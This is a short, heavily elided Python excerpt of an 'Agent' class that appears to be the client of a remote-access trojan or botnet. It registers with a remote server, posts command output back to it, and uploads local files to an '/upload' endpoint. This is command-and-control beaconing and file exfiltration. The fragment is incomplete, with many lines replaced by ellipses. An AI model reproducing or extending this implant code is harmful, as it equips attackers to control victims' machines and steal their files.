...
class Agent(object):
    ...
    def __init__(self, remote, port=8080):
        self.idle = True
        self.silent = False
        ...
        self.server = 'http://{0}:{1}'.format(remote, port)
    ...
    def server_hello(self):
        ...
        req = requests.post(self.server + '/api/' + self.uid + '/hello',
    ...
    def send_output(self, output, newlines=True):
        ...
        if newlines:
            output += "\n\n"
        req = requests.post(self.server + '/api/' + self.uid + '/report',
        data={'output': output})
    ...
    def upload(self, file):
        ...
        try:
            if os.path.exists(file) and os.path.isfile(file):
                ...
                requests.post(self.server + '/api/' + self.uid + '/upload',
